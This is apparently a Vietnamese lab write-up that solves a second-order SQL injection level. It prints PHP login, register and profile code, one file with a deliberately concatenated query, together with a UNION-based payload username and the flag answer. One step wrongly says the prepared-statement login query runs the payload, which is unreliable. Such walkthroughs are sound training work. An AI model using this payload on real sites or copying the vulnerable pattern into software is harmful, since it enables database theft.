# **Level 7:**

`level7.php`
```php
<?php
session_start();
if (isset($_POST["username"]) && isset($_POST["password"])) {
    try {
        include("header.php");
        $database = make_connection("advanced_db");

        $sql = "SELECT username FROM users WHERE username=? and password=?";
        $statement = $database->prepare($sql);
        $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
        $statement->execute();
        $statement->store_result();
        $statement->bind_result($result);

        if ($statement->num_rows > 0) {
            $statement->fetch();
            $_SESSION["username"] = $result;
            die(header("Location: profile.php"));
        } else {
            $message = "Wrong username or password";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }   
}

include("../basic/static/html/second-order.html");
```
`profile.php`
```php
<?php
session_start();
include("header.php");
$database = make_connection("advanced_db");

if (!isset($_SESSION['username']))
    die(header("Location: level7.php"));

$username = $_SESSION['username'];
if (isset($_POST['button'])) {
    try {
        $sql = "SELECT email FROM users WHERE username='$username'";
        $db_result = $database->query($sql);
        $row = $db_result->fetch_assoc(); // Get the first row

        if (isset($row)) 
            $message = $row['email'];
            
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

include("../basic/static/html/profile.html");
```
`register.php`
```php
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        include("header.php");
        $database = make_connection("advanced_db");
        
        $sql = "SELECT username from users where username=?";
        $statement = $database->prepare($sql);
        $statement->bind_param('s', $_POST['username']);
        $statement->execute();
        $statement->store_result();

        if ($statement->num_rows() > 0) {
            $message = "Sorry this username already registered";
        } else {
            $sql = "INSERT INTO users(username, password, email) VALUES (?, ?, ?)";
            $statement = $database->prepare($sql);
            $statement->bind_param('sss', $_POST['username'], md5($_POST['password']), $_POST['email']);
            $statement->execute();
            $message = "Create successful";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

include("../basic/static/html/register.html");
```
Đầu tiên thử tạo 1 tài khoản hợp lệ để xem sao
```
username: mmm
password: 1
email: 1@gmail.com
```
<img width="1046" height="341" alt="image" src="https://github.com/user-attachments/assets/bb45d0e1-344d-43db-8335-72c6ce2d97a3" />

Login vào và `Click here to show your Email`

<img width="1238" height="220" alt="image" src="https://github.com/user-attachments/assets/4f64e329-7e0b-435a-9979-39d61ff6feb6" />

Chúng ta thấy được email là nơi hiển thị 

Đọc source code thì thấy được , `register.php` nó không lọc bất cứ dữ liệu đầu vào nào nhưng nó lại sử dụng placeholder nên cho dù có dùng dấu nháy đơn hay dấu comment cũng không thể phá vỡ cấu trúc cú pháp ở đây được

`level7.php` thì nó lại check password và username có đúng hay không thôi . Và ở đây cũng sử dụng placeholder nên cũng không thể Injection ở đây được 

Lỗ hổng xảy ra tại file `profile.php` 
```sql
$sql = "SELECT email FROM users WHERE username='$username'";
```
Nó nối chuỗi trực tiếp và lấy ra email với username tương ứng rồi in ra màn hình. Vào trong file `db.sql` thì chúng ta thấy được dòng
```sql
INSERT INTO `users` (`id`, `username`, `password`, `email`) VALUES (21, 'FLAG', 'flag{SeConD_oRdEr_SqL_InjecTioN}', 'flag@222.io');
```
Vậy nếu chúng ta có thể lấy được password của `flag` rồi bỏ vào column email thì chúng ta có thể in ra được màn hình flag đang cần .

Câu truy vấn chúng ta cần bây giờ là:
```sql
SELECT email FROM users WHERE username='' UNION SELECT password FROM users WHERE id = 21 -- -
```
Tức là:
```
$sql = "SELECT email FROM users WHERE username='$username'";

$username phải bằng với ' UNION SELECT password FROM users WHERE id = 21 -- -
```
mà `$username` lại được lấy từ việc thực hiện truy vấn ở `level7.php`

Vậy nếu chúng ta đăng kí 
```
username: ' union select password from users where id = 21 -- +
password: 1
email: 1@gmail.com
```
Rồi Login lại thì tại `level7.php` . Nó sẽ xử lý câu lệnh SQL như sau
```
SELECT username FROM users WHERE username= '' union select password from users where id = 21 -- +' and password = '1'
```
Kết quả truy vấn sẽ trả về
```
Cột 1: ' union select password from users where id = 21 -- +
Cột 2: 1
```
Và cái biến `$username` ở `profile.php` sẽ nhận `' union select password from users where id = 21 -- +`

Nhét vào trong `$username` của `SELECT email FROM users WHERE username='$username'` 

Thì lúc này chúng ta sẽ được 
```sql
SELECT email FROM users WHERE username='' union select password from users where id = 21 -- +
```
Thưc hiện thôi 

<img width="1493" height="815" alt="image" src="https://github.com/user-attachments/assets/cf43ce71-a962-410a-85a8-c91fe023360b" />

Login lại bằng username vừa register . Rồi vào trong `Click to here to show your Email` 

<img width="1236" height="218" alt="image" src="https://github.com/user-attachments/assets/65d2d992-76eb-4a6b-abd6-3bf66f418460" />
